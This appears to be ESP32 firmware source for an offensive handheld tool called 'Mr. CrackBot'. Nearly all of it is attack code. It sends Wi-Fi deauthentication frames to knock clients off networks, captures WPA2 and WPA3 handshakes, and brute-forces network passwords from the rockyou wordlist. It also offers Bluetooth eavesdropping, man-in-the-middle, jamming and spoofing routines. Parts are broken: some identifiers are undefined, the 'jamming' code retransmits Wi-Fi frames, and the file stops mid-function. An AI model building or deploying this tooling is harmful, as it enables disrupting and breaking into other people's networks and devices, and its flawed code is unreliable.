#include <Arduino.h>
#include <TFT_eSPI.h>
#include <WiFi.h>
#include <SD.h>
#include <ArduinoJson.h>
#include <WiFiManager.h>
#include <TaskScheduler.h>
#include <pthread.h>
#include <atomic>
#include <mutex>
#include <JPEGDecoder.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <ESPAsyncWebServer.h>
#include <ArduinoOTA.h>

#define ROCKYOU_PATH "/rockyou.txt"
#define SETTINGS_PATH "/settings.json"
#define CHECKPOINT_PATH "/checkpoint.txt"
#define IMAGE_PATH "/mrcb3.jpeg"

TFT_eSPI tft = TFT_eSPI();

struct NetworkInfo {
  String ssid;
  String bssid;
  int rssi;
  int channel;
  bool has_password;
  String password;
  String encryption; // e.g., WPA2, WPA3
  String encryptionType; // e.g., AES, TKIP
  String vendor; // e.g., Cisco, Netgear
};

std::vector<NetworkInfo> networks;
NetworkInfo selectedNetwork;
uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

WiFiManager wifiManager;
Scheduler tscheduler;
AsyncWebServer server(80);
void performNetworkScan();
void performBatteryStatusUpdate();
Task tScanNetworks(0, TASK_ONCE, &performNetworkScan, &tscheduler, false);
Task tUpdateBatteryStatus(60000, TASK_FOREVER, &performBatteryStatusUpdate, &tscheduler, true);
Task tCrackPassword(0, TASK_ONCE, nullptr, &tscheduler, false); // Will be activated manually

std::atomic_long bytesRead(0);
std::atomic_bool foundPassword(false);
std::mutex progressMutex;

std::vector<std::vector<uint8_t>> saeHandshakes;

BLEServer* pServer = nullptr;
BLECharacteristic* pCharacteristic = nullptr;
std::string receivedData = "";

void performNetworkScan();
void performBatteryStatusUpdate();
void crackNetworkPassword();
void deauthNetwork();
void handleHandshakes();
void handleSAEHandshakes();
void fillDeauthPacket(const String &bssid, bool broadcast = false);
String crackPassword(const String &ssid, const String &bssid);
bool tryPassword(const String &ssid, const String &bssid, const String &password);
void displayNetworkInfo(const NetworkInfo &network);
void loadNetworksFromSD();
void saveNetworksToSD();
void setupFirmware();
void displayMenu();
void displaySettingsMenu();
void adjustBrightness();
void togglePromiscuousMode();
void resetNetworkSettings();
void selectNetwork();
void showNetworkInfo();
void showEncryptionInfo();
void pwnNetwork();
void enterDeepSleep();
void setPromiscuousMode(bool enable);
void sendDeauthPackets(const String &bssid, int count, bool broadcast = false);
void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type);
void showIntroAnimation();
void processTouch();
void showImage(const char *filename, bool fillScreen);
void jpegRender(int xpos, int ypos, int widthLimit, int heightLimit);
void drawBackgroundImage();
String getVendorByBSSID(const String &bssid);
void setupBLE();
void handleBLEConnection(BLEServer* pServer);
void handleBLEDisconnection(BLEServer* pServer);
void onBLEWrite(BLECharacteristic* pCharacteristic);
void deployEavesdropping();
void deployMitMAttack();
void deployBluetoothJamming();
void deployBluetoothSpoofing();
void displayBluetoothSecurityMenu();
void displayMitMMenu();
void displayEavesdroppingMenu();
void displayJammingMenu();
void displaySpoofingMenu();

class EavesdropCallback : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) override {
    Serial.printf("Advertised Device: %s\n", advertisedDevice.toString().c_str());

    if (advertisedDevice.haveServiceUUID()) {
      Serial.printf("Found device with UUID: %s\n", advertisedDevice.getServiceUUID().toString().c_str());

      BLEClient* pClient = BLEDevice::createClient();
      pClient->connect(&advertisedDevice);
      Serial.println("Connected to device");

      BLERemoteService* pRemoteService = pClient->getService(advertisedDevice.getServiceUUID());
      if (pRemoteService != nullptr) {
        std::vector<BLERemoteCharacteristic*> characteristics = pRemoteService->getCharacteristics();
        for (auto& characteristic : characteristics) {
          if (characteristic->canRead()) {
            std::string value = characteristic->readValue();
            Serial.printf("Characteristic %s Value: %s\n", characteristic->getUUID().toString().c_str(), value.c_str());

            logData(advertisedDevice, characteristic, value);
          }

          if (characteristic->canNotify()) {
            characteristic->registerForNotify(onNotify);
          }
        }
      }

      analyzeEncryption(advertisedDevice);

      pClient->disconnect();
    }
  }

  static void onNotify(BLERemoteCharacteristic* pBLERemoteCharacteristic, uint8_t* pData, size_t length, bool isNotify) {
    std::string value((char*)pData, length);
    Serial.printf("Notification from %s: %s\n", pBLERemoteCharacteristic->getUUID().toString().c_str(), value.c_str());

    // Log and process the notification data
    logNotification(pBLERemoteCharacteristic, value);
  }

  // Function to log data
  static void logData(BLEAdvertisedDevice advertisedDevice, BLERemoteCharacteristic* characteristic, std::string value) {
    File dataFile = SD.open("/eavesdrop_log.txt", FILE_APPEND);
    if (dataFile) {
      dataFile.printf("Timestamp: %lu, Device: %s, Characteristic: %s, Value: %s\n", millis(), advertisedDevice.toString().c_str(), characteristic->getUUID().toString().c_str(), value.c_str());
      dataFile.close();
    } else {
      Serial.println("Failed to open log file.");
    }
  }

  // Function to log notifications
  static void logNotification(BLERemoteCharacteristic* characteristic, std::string value) {
    File dataFile = SD.open("/eavesdrop_log.txt", FILE_APPEND);
    if (dataFile) {
      dataFile.printf("Timestamp: %lu, Notification from %s: %s\n", millis(), characteristic->getUUID().toString().c_str(), value.c_str());
      dataFile.close();
    } else {
      Serial.println("Failed to open log file.");
    }
  }

  // Function to analyze encryption
  static void analyzeEncryption(BLEAdvertisedDevice advertisedDevice) {
    Serial.printf("Analyzing encryption for device: %s\n", advertisedDevice.toString().c_str());

    // Advanced encryption analysis logic
    // This can include checking for the presence of secure connections, analyzing encryption strength, etc.
    if (advertisedDevice.haveAppearance()) {
      int appearance = advertisedDevice.getAppearance();
      Serial.printf("Device appearance: %d\n", appearance);

      // Perform additional analysis based on device appearance or other criteria
      if (advertisedDevice.haveManufacturerData()) {
        std::string manufacturerData = advertisedDevice.getManufacturerData();
        Serial.printf("Manufacturer Data: %s\n", manufacturerData.c_str());
        // Analyze manufacturer data for encryption capabilities
      }

      if (advertisedDevice.haveTXPower()) {
        int txPower = advertisedDevice.getTXPower();
        Serial.printf("TX Power: %d\n", txPower);
        // Use TX power information to assess signal strength and potential security risks
      }
    }
  }
};

// Function to show intro animation
void showIntroAnimation() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_RED, TFT_BLACK);
  tft.setTextSize(3);
  tft.setCursor((tft.width() - tft.textWidth("Mr. CrackBot")) / 2, tft.height() / 2 - 20);
  tft.print("Mr. CrackBot");
  delay(1000);
  tft.fillScreen(TFT_BLACK);
  tft.setCursor((tft.width() - tft.textWidth("by $alvadorData")) / 2, tft.height() / 2 + 20);
  tft.print("by $alvadorData");
  delay(1000);
  tft.fillScreen(TFT_BLACK);
  showImage(IMAGE_PATH, true);
  delay(3000);
}

// Function to display an image from SD card and optionally fill the screen
void showImage(const char *filename, bool fillScreen) {
  if (!SD.begin()) {
    tft.println("SD Card initialization failed.");
    return;
  }

  File jpgFile = SD.open(filename);
  if (!jpgFile) {
    tft.println("Failed to open image file.");
    return;
  }

  JpegDec.decodeSdFile(jpgFile);

  int16_t jpgWidth = JpegDec.width;
  int16_t jpgHeight = JpegDec.height;
  int16_t tftWidth = tft.width();
  int16_t tftHeight = tft.height();

  float ratio = min((float)tftWidth / jpgWidth, (float)tftHeight / jpgHeight);
  int newWidth = jpgWidth * ratio;
  int newHeight = jpgHeight * ratio;

  int xOffset = (tftWidth - newWidth) / 2;
  int yOffset = (tftHeight - newHeight) / 2;

  tft.setSwapBytes(true);
  JpegDec.decodeSdFile(jpgFile);
  jpegRender(xOffset, yOffset, newWidth, newHeight);

  jpgFile.close();
}

// Function to render JPEG images
void jpegRender(int xpos, int ypos, int widthLimit, int heightLimit) {
  uint16_t *pImg;
  uint16_t mcu_w = JpegDec.MCUWidth;
  uint16_t mcu_h = JpegDec.MCUHeight;
  uint16_t max_x = JpegDec.width;
  uint16_t max_y = JpegDec.height;

  while (JpegDec.read()) {
    pImg = JpegDec.pImage;
    int mcu_x = JpegDec.MCUx;
    int mcu_y = JpegDec.MCUy;
    int win_w = mcu_w;
    int win_h = mcu_h;

    if (mcu_x + mcu_w >= max_x) {
      win_w = max_x - mcu_x;
    }

    if (mcu_y + mcu_h >= max_y) {
      win_h = max_y - mcu_y;
    }

    tft.pushImage(xpos + mcu_x, ypos + mcu_y, win_w, win_h, pImg);
  }
}

// Function to draw the background image
void drawBackgroundImage() {
  tft.fillScreen(TFT_BLACK);
  showImage(IMAGE_PATH, true);
}

// Function to animate buttons
void animateButton(uint16_t x, uint16_t y, uint16_t w, uint16_t h, bool hover) {
  if (hover) {
    for (int i = 0; i < 5; i++) {
      tft.drawRect(x - i, y - i, w + 2 * i, h + 2 * i, TFT_WHITE);
      delay(20);
    }
    for (int i = 4; i >= 0; i--) {
      tft.drawRect(x - i, y - i, w + 2 * i, h + 2 * i, TFT_BLACK);
      delay(20);
    }
  }
}

// Function to animate menu buttons floating in from left to right
void animateMenuButton(uint16_t x, uint16_t y, uint16_t w, uint16_t h) {
  for (int i = -w; i <= x; i += 10) {
    tft.fillRect(i - 10, y, w, h, TFT_BLACK);
    tft.fillRect(i, y, w, h, TFT_WHITE);
    delay(10);
  }
}

// Function to show the scroll bar
void showScrollBar() {
  tft.fillRect(0, 0, 40, 240, TFT_DARKGREY);
  for (int i = 0; i < 6; i++) {
    tft.fillCircle(20, 40 * (i + 1), 10, TFT_WHITE);
  }
}

void crackNetworkPassword() {
  if (!selectedNetwork.ssid.isEmpty()) {
    tCrackPassword.setCallback([]() {
      selectedNetwork.password = crackPassword(selectedNetwork.ssid, selectedNetwork.bssid);
      saveNetworksToSD();
      displayNetworkInfo(selectedNetwork);
      tft.println("Password cracking completed.");
      tCrackPassword.disable();
    });
    tft.println("Cracking password...");
    tCrackPassword.enable();
  } else {
    tft.println("No network selected.");
  }
}

void deauthNetwork() {
  if (!selectedNetwork.ssid.isEmpty() && selectedNetwork.encryption == "WPA2") {
    setPromiscuousMode(true);
    sendDeauthPackets(selectedNetwork.bssid, 100, true); // Send broadcast deauth packets
    sendDeauthPackets(selectedNetwork.bssid, 100, false); // Send unicast deauth packets
    setPromiscuousMode(false);
    tft.println("Deauth packets sent.");
  } else {
    tft.println("No network selected or WPA3 network which is resistant to deauth attacks.");
  }
}

void handleHandshakes() {
  if (selectedNetwork.ssid.isEmpty()) {
    tft.println("No network selected.");
    return;
  }

  if (selectedNetwork.encryption == "WPA3") {
    handleSAEHandshakes();
    return;
  }

  setPromiscuousMode(true);
  fillDeauthPacket(selectedNetwork.bssid);

  // Send deauth packets and capture handshakes concurrently
  for (int i = 0; i < 50; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(20);
  }

  setPromiscuousMode(false);
  tft.println("Handshake capture initiated.");
}

void handleSAEHandshakes() {
  tft.println("Attempting to capture SAE handshakes for WPA3.");
  saeHandshakes.clear();

  setPromiscuousMode(true);

  esp_wifi_set_promiscuous_rx_cb([](void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *payload = pkt->payload;
    int headerLength = pkt->rx_ctrl.sig_len;
    int payloadLen = headerLength;

    if (payloadLen > 0 && payload[0] == 0xB0) {
      // Extract SAE handshake frames
      std::vector<uint8_t> handshake(payload, payload + headerLength + payloadLen);
      saeHandshakes.push_back(handshake);
      tft.println("SAE handshake frame captured.");
    }
  });

  delay(10000);

  setPromiscuousMode(false);
  tft.println("SAE handshake capture completed.");

  if (saeHandshakes.empty()) {
    tft.println("No SAE handshakes captured.");
  } else {
    tft.println("SAE handshakes captured.");
    // Save SAE handshakes to SD card
    File file = SD.open("/sae_handshakes.bin", FILE_WRITE);
    for (const auto &handshake : saeHandshakes) {
      file.write(handshake.data(), handshake.size());
    }
    file.close();
  }
}

void fillDeauthPacket(const String &bssid, bool broadcast) {
  for (int i = 0; i < 6; ++i) {
    deauthPacket[10 + i] = strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
    deauthPacket[16 + i] = broadcast ? 0xFF : strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

String crackPassword(const String &ssid, const String &bssid) {
  File rockyouFile = SD.open(ROCKYOU_PATH, FILE_READ);
  if (!rockyouFile) {
    Serial.println("Failed to open rockyou.txt.");
    tft.println("Failed to open wordlist.");
    return "";
  }

  long fileSize = rockyouFile.size();
  bytesRead = 0;
  foundPassword = false;
  String password;
  String line;
  tft.println("Cracking Password...");

  long checkpoint = 0;
  File checkpointFile = SD.open(CHECKPOINT_PATH, FILE_READ);
  if (checkpointFile) {
    checkpoint = checkpointFile.parseInt();
    checkpointFile.close();
  }

  rockyouFile.seek(checkpoint);

  int numThreads = 4; // Number of threads
  pthread_t threads[numThreads];
  struct CrackThreadArgs {
    File rockyouFile;
    String ssid;
    String bssid;
    long fileSize;
    std::atomic_long *bytesRead;
    std::atomic_bool *foundPassword;
    String *password;
    std::mutex *progressMutex;
  };

  auto crackThread = [](void *args) -> void * {
    CrackThreadArgs *crackArgs = (CrackThreadArgs *)args;
    File rockyouFile = crackArgs->rockyouFile;
    String ssid = crackArgs->ssid;
    String bssid = crackArgs->bssid;
    long fileSize = crackArgs->fileSize;
    std::atomic_long *bytesRead = crackArgs->bytesRead;
    std::atomic_bool *foundPassword = crackArgs->foundPassword;
    String *password = crackArgs->password;
    std::mutex *progressMutex = crackArgs->progressMutex;

    while (rockyouFile.available() && !foundPassword->load()) {
      String line = rockyouFile.readStringUntil('\n');
      bytesRead->fetch_add(line.length() + 1);
      line.trim();
      if (tryPassword(ssid, bssid, line)) {
        *password = line;
        foundPassword->store(true);
        break;
      }

      int progress = (int)((bytesRead->load() / (float)fileSize) * 100);
      {
        std::lock_guard<std::mutex> lock(*progressMutex);
        tft.fillRect(0, 50, 320, 20, TFT_BLACK);
        tft.setCursor(0, 50);
        tft.printf("Progress: %d%%", progress);
      }

      delay(5);

      uint16_t touchX, touchY;
      if (tft.getTouch(&touchX, &touchY)) {
        tft.println("User interrupted the process.");
        break;
      }
    }
    return NULL;
  };

  CrackThreadArgs args = {rockyouFile, ssid, bssid, fileSize, &bytesRead, &foundPassword, &password, &progressMutex};
  for (int i = 0; i < numThreads; ++i) {
    pthread_create(&threads[i], NULL, crackThread, &args);
  }

  for (int i = 0; i < numThreads; ++i) {
    pthread_join(threads[i], NULL);
  }

  checkpointFile = SD.open(CHECKPOINT_PATH, FILE_WRITE);
  if (checkpointFile) {
    checkpointFile.println(bytesRead.load());
    checkpointFile.close();
  }

  rockyouFile.close();
  return password;
}

bool tryPassword(const String &ssid, const String &bssid, const String &password) {
  Serial.printf("Trying password: %s for SSID: %s\n", password.c_str(), ssid.c_str());

  WiFi.disconnect();
  delay(100);
  WiFi.begin(ssid.c_str(), password.c_str());

  unsigned long startTime = millis();
  while (WiFi.status() != WL_CONNECTED && (millis() - startTime) < 10000) {
    delay(200);
    Serial.print(".");
  }
  
  bool isConnected = (WiFi.status() == WL_CONNECTED);
  
  if (isConnected) {
    Serial.println("Connected!");
    WiFi.disconnect();
    return true;
  } else {
    Serial.println("Failed to connect.");
    return false;
  }
}

void displayNetworkInfo(const NetworkInfo &network) {
  drawBackgroundImage();
  tft.setCursor(0, 0);
  tft.setTextSize(2);
  tft.printf("SSID: %s\n", network.ssid.c_str());
  tft.printf("BSSID: %s\n", network.bssid.c_str());
  tft.printf("RSSI: %d dBm\n", network.rssi);
  tft.printf("Channel: %d\n", network.channel);
  tft.printf("Encryption: %s\n", network.encryption.c_str());
  tft.printf("Encryption Type: %s\n", network.encryptionType.c_str());
  tft.printf("Vendor: %s\n", network.vendor.c_str());
  tft.printf("Has Password: %s\n", network.has_password ? "Yes" : "No");
  if (network.has_password) {
    tft.printf("Password: %s\n", network.password.isEmpty() ? "Not cracked" : network.password.c_str());
  }
}

void loadNetworksFromSD() {
  File file = SD.open("/networks.json", FILE_READ);
  if (!file) {
    Serial.println("Failed to open networks.json.");
    tft.println("No networks to select.");
    return;
  }
  
  DynamicJsonDocument doc(2048);
  DeserializationError error = deserializeJson(doc, file);
  if (error) {
    Serial.println("Failed to parse JSON.");
    tft.println("Failed to parse JSON.");
    file.close();
    return;
  }
  
  networks.clear();
  for (JsonObject network : doc["networks"].as<JsonArray>()) {
    NetworkInfo net;
    net.ssid = network["ssid"].as<String>();
    net.bssid = network["bssid"].as<String>();
    net.rssi = network["rssi"];
    net.channel = network["channel"];
    net.has_password = network["has_password"];
    net.password = network["password"].as<String>();
    net.encryption = network["encryption"].as<String>();
    net.encryptionType = network["encryptionType"].as<String>();
    net.vendor = network["vendor"].as<String>();
    networks.push_back(net);
  }
  file.close();
}

void saveNetworksToSD() {
  DynamicJsonDocument doc(2048);
  JsonArray networkArray = doc.createNestedArray("networks");
  
  for (const NetworkInfo &network : networks) {
    JsonObject net = networkArray.createNestedObject();
    net["ssid"] = network.ssid;
    net["bssid"] = network.bssid;
    net["rssi"] = network.rssi;
    net["channel"] = network.channel;
    net["has_password"] = network.has_password;
    net["password"] = network.password;
    net["encryption"] = network.encryption;
    net["encryptionType"] = network.encryptionType;
    net["vendor"] = network.vendor;
  }

  File file = SD.open("/networks.json", FILE_WRITE);
  if (!file) {
    Serial.println("Failed to open networks.json for writing.");
    tft.println("Failed to save networks.");
    return;
  }
  serializeJson(doc, file);
  file.close();
}

String getVendorByBSSID(const String &bssid) {
  // Add a few example vendors. You can expand this list.
  if (bssid.startsWith("00:1A:11")) return "Cisco";
  if (bssid.startsWith("00:1B:63")) return "Netgear";
  if (bssid.startsWith("00:1E:58")) return "D-Link";
  return "Unknown Vendor";
}

void setupFirmware() {
  // Initialize TFT
  tft.init();
  tft.setRotation(1);

  tft.begin();

  if (!SD.begin()) {
    tft.println("SD Card initialization failed.");
    return;
  }

  showIntroAnimation();

  loadNetworksFromSD();

  wifiManager.autoConnect("AutoConnectAP");

  tscheduler.addTask(tScanNetworks);
  tscheduler.addTask(tUpdateBatteryStatus);
  tscheduler.addTask(tCrackPassword);

  tScanNetworks.enable();

  tscheduler.startNow();

  setupBLE();
}

void displayMenu() {
  drawBackgroundImage();
  tft.setCursor(0, 0);
  tft.setTextSize(2);
  tft.println("1. Scan Networks");
  tft.println("2. Show Networks");
  tft.println("3. Settings");
  tft.println("4. Adjust Brightness");
  tft.println("5. Reset Network Settings");
  tft.println("6. Bluetooth Security Menu");
  tft.println("7. Enter Deep Sleep");

  animateMenuButton(0, 0, tft.width(), 40);
  animateMenuButton(0, 40, tft.width(), 40);
  animateMenuButton(0, 80, tft.width(), 40);
  animateMenuButton(0, 120, tft.width(), 40);
  animateMenuButton(0, 160, tft.width(), 40);
  animateMenuButton(0, 200, tft.width(), 40);
}

void displaySettingsMenu() {
  drawBackgroundImage();
  tft.setCursor(0, 0);
  tft.setTextSize(2);
  tft.println("Settings");
  tft.println("1. Toggle Promiscuous Mode");
  tft.println("2. Adjust Brightness");
  tft.println("3. Reset Network Settings");

  animateMenuButton(0, 0, tft.width(), 40);
  animateMenuButton(0, 40, tft.width(), 40);
  animateMenuButton(0, 80, tft.width(), 40);
}

void adjustBrightness() {
  drawBackgroundImage();
  tft.setCursor(0, 0);
  tft.setTextSize(2);
  tft.println("Adjust Brightness");

  int brightness = 128; // Initial brightness value
  tft.fillRect(50, 100, 220, 30, TFT_WHITE);
  tft.fillRect(50 + brightness, 100, 10, 30, TFT_BLACK);

  while (true) {
    uint16_t touchX, touchY;
    if (tft.getTouch(&touchX, &touchY)) {
      if (touchX > 50 && touchX < 270 && touchY > 100 && touchY < 130) {
        brightness = touchX - 50;
        tft.fillRect(50, 100, 220, 30, TFT_WHITE);
        tft.fillRect(50 + brightness, 100, 10, 30, TFT_BLACK);
        ledcWrite(7, brightness); // Adjust backlight brightness using PWM
      } else if (touchX > 10 && touchY > 10 && touchY < 40) {
        break; // Exit loop on touch outside the slider area
      }
    }
  }
}

void togglePromiscuousMode() {
  static bool promiscuousMode = false;
  promiscuousMode = !promiscuousMode;
  setPromiscuousMode(promiscuousMode);
  drawBackgroundImage();
  tft.setCursor(0, 0);
  tft.setTextSize(2);
  tft.printf("Promiscuous Mode: %s\n", promiscuousMode ? "Enabled" : "Disabled");
}

void resetNetworkSettings() {
  WiFi.disconnect(true);
  delay(1000);
  ESP.restart();
}

void selectNetwork() {
  if (networks.empty()) {
    tft.println("No networks to select.");
    return;
  }

  drawBackgroundImage();
  tft.setCursor(0, 0);
  tft.setTextSize(2);

  for (size_t i = 0; i < networks.size(); ++i) {
    tft.printf("%d. %s\n", i + 1, networks[i].ssid.c_str());
  }

  while (true) {
    uint16_t touchX, touchY;
    if (tft.getTouch(&touchX, &touchY)) {
      int selectedIndex = touchY / 40; // Adjust this based on your text size and screen layout
      if (selectedIndex >= 0 && selectedIndex < networks.size()) {
        selectedNetwork = networks[selectedIndex];
        displayNetworkInfo(selectedNetwork);
        showEncryptionInfo(); // Show encryption info
        break;
      }
    }
  }
}

void showEncryptionInfo() {
  tft.setCursor(0, 120);
  tft.setTextSize(2);
  tft.printf("Encryption: %s\n", selectedNetwork.encryption.c_str());
  tft.printf("Encryption Type: %s\n", selectedNetwork.encryptionType.c_str());
  tft.printf("Vendor: %s\n", selectedNetwork.vendor.c_str());
}

void showNetworkInfo() {
  if (selectedNetwork.ssid.isEmpty()) {
    tft.println("No network selected.");
    return;
  }

  displayNetworkInfo(selectedNetwork);
  showEncryptionInfo();
}

void pwnNetwork() {
  if (selectedNetwork.ssid.isEmpty()) {
    tft.println("No network selected.");
    return;
  }

  handleHandshakes();
}

void enterDeepSleep() {
  drawBackgroundImage();
  tft.setCursor(0, 0);
  tft.setTextSize(2);
  tft.println("Entering deep sleep...");
  delay(1000);
  tft.fillScreen(TFT_BLACK);
  esp_deep_sleep_start();
}

void setPromiscuousMode(bool enable) {
  esp_wifi_set_promiscuous(enable);
  if (enable) {
    esp_wifi_set_promiscuous_rx_cb(promiscuous_rx_cb);
  }
}

void sendDeauthPackets(const String &bssid, int count, bool broadcast) {
  fillDeauthPacket(bssid, broadcast);
  for (int i = 0; i < count; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(20);
  }
}

void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  // Handle received packets
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *payload = pkt->payload;
  int headerLength = pkt->rx_ctrl.sig_len;
  int payloadLen = headerLength;

  if (payloadLen > 0 && payload[0] == 0xB0) {
    // Extract authentication frames
    std::vector<uint8_t> authFrame(payload, payload + headerLength + payloadLen);
    saeHandshakes.push_back(authFrame);
    tft.println("Authentication frame captured.");
  }
}

void performBatteryStatusUpdate() {
  int batteryPin = 35; // Example ADC pin for battery voltage
  int adcValue = analogRead(batteryPin); 
  float voltage = adcValue * (3.3 / 4095.0); 
  int percentage = (int)((voltage - 3.0) / (4.2 - 3.0) * 100); // Convert voltage to percentage

  if (percentage > 100) {
    percentage = 100;
  } else if (percentage < 0) {
    percentage = 0;
  }

  drawBackgroundImage();
  tft.setCursor(0, 0);
  tft.setTextSize(2);
  tft.printf("Battery: %d%%\n", percentage);

  delay(1000);
}

void performNetworkScan() {
  tft.println("Scanning for networks...");
  networks.clear();

  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; ++i) {
    NetworkInfo net;
    net.ssid = WiFi.SSID(i);
    net.bssid = WiFi.BSSIDstr(i);
    net.rssi = WiFi.RSSI(i);
    net.channel = WiFi.channel(i);

    switch (WiFi.encryptionType(i)) {
      case WIFI_AUTH_OPEN:
        net.encryption = "Open";
        net.encryptionType = "None";
        break;
      case WIFI_AUTH_WEP:
        net.encryption = "WEP";
        net.encryptionType = "WEP";
        break;
      case WIFI_AUTH_WPA_PSK:
        net.encryption = "WPA";
        net.encryptionType = "TKIP";
        break;
      case WIFI_AUTH_WPA2_PSK:
        net.encryption = "WPA2";
        net.encryptionType = "AES";
        break;
      case WIFI_AUTH_WPA_WPA2_PSK:
        net.encryption = "WPA/WPA2";
        net.encryptionType = "TKIP/AES";
        break;
      case WIFI_AUTH_WPA3_PSK:
        net.encryption = "WPA3";
        net.encryptionType = "AES";
        break;
      case WIFI_AUTH_WPA2_ENTERPRISE:
        net.encryption = "WPA2 Enterprise";
        net.encryptionType = "AES";
        break;
      default:
        net.encryption = "Unknown";
        net.encryptionType = "Unknown";
        break;
    }

    net.vendor = getVendorByBSSID(net.bssid);
    networks.push_back(net);
  }

  saveNetworksToSD();
  tft.println("Scan complete.");
}

void setupBLE() {
  BLEDevice::init(bleDeviceName.c_str());
  pServer = BLEDevice::createServer();
  pServer->setCallbacks(new ServerCallbacks());

  BLEService* pService = pServer->createService(BLEUUID(SERVICE_UUID));
  pCharacteristic = pService->createCharacteristic(
      BLEUUID(CHARACTERISTIC_UUID),
      BLECharacteristic::PROPERTY_READ |
      BLECharacteristic::PROPERTY_WRITE
  );

  pCharacteristic->setCallbacks(new BLEWriteCallback());
  pService->start();
  pServer->getAdvertising()->start();
}

class ServerCallbacks : public BLEServerCallbacks {
  void onConnect(BLEServer* pServer) {
    tft.println("Device connected");
    // Secure connection established logic
  }

  void onDisconnect(BLEServer* pServer) {
    tft.println("Device disconnected");
    // Secure disconnection logic
  }
};

class BLEWriteCallback : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic* pCharacteristic) {
    std::string value = pCharacteristic->getValue();
    Serial.printf("Received value: %s\n", value.c_str());
    // Secure processing of received data
  }
};

void deployEavesdropping() {
  tft.println("Deploying Eavesdropping...");

  BLEDevice::init("ESP32_Eavesdrop");
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new EavesdropCallback());
  pBLEScan->setActiveScan(true);
  pBLEScan->start(30, false);

  tft.println("Eavesdropping deployment completed.");
}

void deployMitMAttack() {
  tft.println("Deploying MitM Attacks...");

  BLEDevice::init("ESP32_MitM");
  BLEServer* pServer = BLEDevice::createServer();
  BLEService* pService = pServer->createService(BLEUUID((uint16_t)0x180D));
  BLECharacteristic* pCharacteristic = pService->createCharacteristic(
                                       BLEUUID((uint16_t)0x2A37),
                                       BLECharacteristic::PROPERTY_READ |
                                       BLECharacteristic::PROPERTY_WRITE |
                                       BLECharacteristic::PROPERTY_NOTIFY
                                     );

  class MitMCallback : public BLECharacteristicCallbacks {
    void onWrite(BLECharacteristic* pCharacteristic) {
      std::string value = pCharacteristic->getValue();
      Serial.printf("Received write request: %s\n", value.c_str());
      pCharacteristic->setValue("Altered Data");
    }

    void onRead(BLECharacteristic* pCharacteristic) {
      Serial.printf("Read request: %s\n", pCharacteristic->getValue().c_str());
    }
  };

  pCharacteristic->setCallbacks(new MitMCallback());
  pService->start();
  pServer->getAdvertising()->start();

  tft.println("MitM attack deployment completed.");
}

void deployBluetoothJamming() {
  tft.println("Deploying Bluetooth Jamming...");

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MGMT) {
      wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
      uint8_t* data = pkt->payload;
      size_t len = pkt->rx_ctrl.sig_len;

      if (data[0] == 0x80 || data[0] == 0x40) {
        Serial.printf("Disrupting packet: %d bytes\n", len);
        esp_wifi_80211_tx(WIFI_IF_AP, data, len, false);
      }
    }
  });

  tft.println("Bluetooth jamming deployment completed.");
}

void deployBluetoothSpoofing() {
  tft.println("Deploying Bluetooth Spoofing...");

  BLEDevice::init("ESP32_Spoof");
  BLEServer* pServer = BLEDevice::createServer();
  BLEService* pService = pServer->createService(BLEUUID((uint16_t)0x180F));
  BLECharacteristic* pCharacteristic = pService->createCharacteristic(
                                       BLEUUID((uint16_t)0x2A19),
                                       BLECharacteristic::PROPERTY_READ |
                                       BLECharacteristic::PROPERTY_WRITE
                                     );

  pCharacteristic->setValue("Spoofed data");
  pService->start();
  pServer->getAdvertising()->start();

  tft.println("Bluetooth spoofing deployment completed.");
}

void displayBluetoothSecurityMenu() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE);

  animateButton(10, 40, 200, 40, false);
  tft.setCursor(20, 50);
  tft.print("Eavesdropping");

  animateButton(10, 90, 200, 40, false);
  tft.setCursor(20, 100);
  tft.print("MitM Attack");

  animateButton(10, 140, 200, 40, false);
  tft.setCursor(20, 150);
  tft.print("Bluetooth Jamming");

  animateButton(10, 190, 200, 40, false);
  tft.setCursor(20, 200);
  tft.print("Bluetooth Spoofing");
}

void processBluetoothTouch() {
  uint16_t x, y;
  if (tft.getTouch(&x, &y)) {
    if (x > 10 && x < 210) {
      if (y > 40 && y < 80) {
        animateButton(10, 40, 200, 40, true);
        deployEavesdropping();
        animateButton(10, 40, 200, 40, false);
      } else if (y > 90 && y < 130) {
        animateButton(10, 90, 200, 40, true);
        deployMitMAttack();
        animateButton(10, 90, 200, 40, false);
      } else if (y > 140 && y < 180) {
        animateButton(10, 140, 200, 40, true);
        deployBluetoothJamming();
        animateButton(10, 140, 200, 40, false);
      } else if (y > 190 && y < 230) {
        animateButton(10, 190, 200, 40, true);
        deployBluetoothSpoofing();
        animateButton(10, 190, 200, 40, false);
      }
    }
  }
}

void setup() {
  Serial.begin(115200);
  setupFirmware();
}

void loop() {
  tscheduler.execute();
  processTouch();
}

void processTouch() {
  uint16_t touchX, touchY;
